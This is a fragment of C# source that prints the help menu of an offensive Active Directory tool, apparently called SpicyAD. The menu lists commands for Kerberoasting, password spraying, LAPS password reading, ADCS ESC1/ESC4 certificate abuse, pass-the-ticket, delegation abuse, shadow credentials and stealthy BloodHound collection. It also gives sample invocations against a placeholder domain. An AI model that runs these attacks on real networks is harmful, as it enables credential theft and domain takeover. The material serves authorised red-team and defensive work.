            Console.WriteLine("  /user:<user>       - Username (DOMAIN\\user or user)");
            Console.WriteLine("  /password:<pwd>    - Password for authentication");
            Console.WriteLine("  /dns:<ip>          - Custom DNS server (defaults to DC IP)");
            Console.WriteLine("  /ldaps, /ssl       - Use LDAPS (SSL/TLS, port 636)");
            Console.WriteLine("\nENUMERATION COMMANDS:");
            Console.WriteLine("  domain-info         - Get domain information");
            Console.WriteLine("  enum-dcs           - Enumerate domain controllers");
            Console.WriteLine("  domain-trusts      - Enumerate domain trusts");
            Console.WriteLine("  enum-users         - Enumerate domain users");
            Console.WriteLine("  enum-computers     - Enumerate domain computers (with IP resolution)");
            Console.WriteLine("  enum-shares        - Enumerate SYSVOL/NETLOGON shares");
            Console.WriteLine("  find-shares [host] - Enumerate shares on all computers (or specific host)");
            Console.WriteLine("  enum-vulns         - Enumerate vulnerable certificates (ESC1-8)");
            Console.WriteLine("  enum-certs [/out:] - Enumerate ALL certificates (Certify-style)");
            Console.WriteLine("  delegations        - Enumerate ALL delegations (Unconstrained/Constrained/RBCD)");
            Console.WriteLine("  laps [/target:<pc>]- Read LAPS passwords (all computers or specific target)");
            Console.WriteLine("\nATTACK COMMANDS:");
            Console.WriteLine("  kerberoast         - Perform Kerberoasting attack");
            Console.WriteLine("  asreproast         - Perform AS-REP Roasting attack");
            Console.WriteLine("  targeted-kerberoast - Targeted Kerberoasting (set SPN)");
            Console.WriteLine("  spray /password:<pwd> [/delay:<ms>]  - Password Spray via Kerberos");
            Console.WriteLine("\nOBJECT MANAGEMENT:");
            Console.WriteLine("  add-user /name:<name> /new-pass:<pwd>         - Add user account");
            Console.WriteLine("  delete-user /target:<name> [/force]           - Delete user account");
            Console.WriteLine("  add-machine /name:<name> [/mac-pass:<pwd>]    - Add machine account");
            Console.WriteLine("  add-to-group /member:<user> /group:<group>    - Add user to group");
            Console.WriteLine("  change-password /target:<u> /old:<o> /new:<n> - Change user password");
            Console.WriteLine("\nADCS ATTACKS:");
            Console.WriteLine("  esc1 /template:<name> /target:<user> [/sid]  - ESC1: Request cert with SAN");
            Console.WriteLine("  esc4 /template:<name> /target:<user> [/sid]  - ESC4: Full attack chain");
            Console.WriteLine("  esc4 list                                    - List ESC4 vulnerable templates");
            Console.WriteLine("  esc4 backup <template>                       - Backup template configuration");
            Console.WriteLine("  esc4 modify <template>                       - Modify template to ESC1");
            Console.WriteLine("  esc4 restore <backup.json>                   - Restore from backup");
            Console.WriteLine("\nKERBEROS:");
            Console.WriteLine("  asktgt /certificate:<pfx> [/getcredentials]  - PKINIT: Certificate to TGT");
            Console.WriteLine("  dump [/luid:] [/service:] [/nowrap]          - Dump Kerberos tickets");
            Console.WriteLine("  ptt <ticket.kirbi>                           - Pass-the-Ticket");
            Console.WriteLine("\nDELEGATION ATTACKS:");
            Console.WriteLine("  rbcd set /target:<pc> /controlled:<acct>     - Configure RBCD");
            Console.WriteLine("  rbcd get /target:<pc>                        - View RBCD configuration");
            Console.WriteLine("  rbcd clear /target:<pc>                      - Clear RBCD");
            Console.WriteLine("  s4u /target:<pc> /controlled:<acct> /password:<pwd> [/impersonate:<user>] [/service:cifs]");
            Console.WriteLine("\nSHADOW CREDENTIALS:");
            Console.WriteLine("  shadow-creds add /target:<user> [/sid]       - Add shadow credential");
            Console.WriteLine("  shadow-creds list /target:<user>             - List shadow credentials");
            Console.WriteLine("  shadow-creds remove /target:<user> /deviceid:<guid>");
            Console.WriteLine("  shadow-creds clear /target:<user>            - Remove all");
            Console.WriteLine("\nBLOODHOUND COLLECTION:");
            Console.WriteLine("  bloodhound                                   - Default collection");
            Console.WriteLine("  bloodhound all                               - Collect everything");
            Console.WriteLine("  bloodhound dconly                            - LDAP only (stealth)");
            Console.WriteLine("  bloodhound /collection:<method>              - Custom collection");
            Console.WriteLine("  bloodhound /outputdir:<path>                 - Output directory");
            Console.WriteLine("  bloodhound /stealth                          - Skip noisy enumeration");
            Console.WriteLine("  bloodhound help                              - Show BloodHound options");
            Console.WriteLine("\nEXAMPLES:");
            Console.WriteLine("  SpicyAD.exe enum-users");
            Console.WriteLine("  SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 enum-users");
            Console.WriteLine("  SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ss enum-users");
            Console.WriteLine("  SpicyAD.exe kerberoast");
            Console.WriteLine("  SpicyAD.exe esc1 /template:ESC1 /user:administrator /domain:evilcorp.net /dc-ip:10.10.10.10");
        }
    }
}
